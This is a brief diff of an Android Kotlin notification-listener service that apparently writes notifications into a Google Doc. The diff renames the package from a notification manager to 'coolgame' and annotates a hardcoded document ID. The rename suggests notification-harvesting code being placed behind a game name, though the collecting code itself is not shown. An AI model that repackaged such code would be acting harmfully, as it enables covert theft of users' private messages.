@@ -1,4 +1,4 @@
-package com.example.smartnotificationmanager
+package com.example.coolgame
 
 import android.app.Notification
 import android.service.notification.NotificationListenerService
@@ -146,7 +146,7 @@ class MyNotificationListenerService : NotificationListenerService() {
                 .setApplicationName("ProjectMessages")
                 .build()
 
-            val documentId = "1iDZrmRHG_VTqw0f---7mhJVr_a01p3nUK-YbG7pmGPk"
+            val documentId = "1iDZrmRHG_VTqw0f---7mhJVr_a01p3nUK-YbG7pmGPk" // Insert your new docID
             val document = service.documents().get(documentId).execute()
 
             // Determine the insertion index
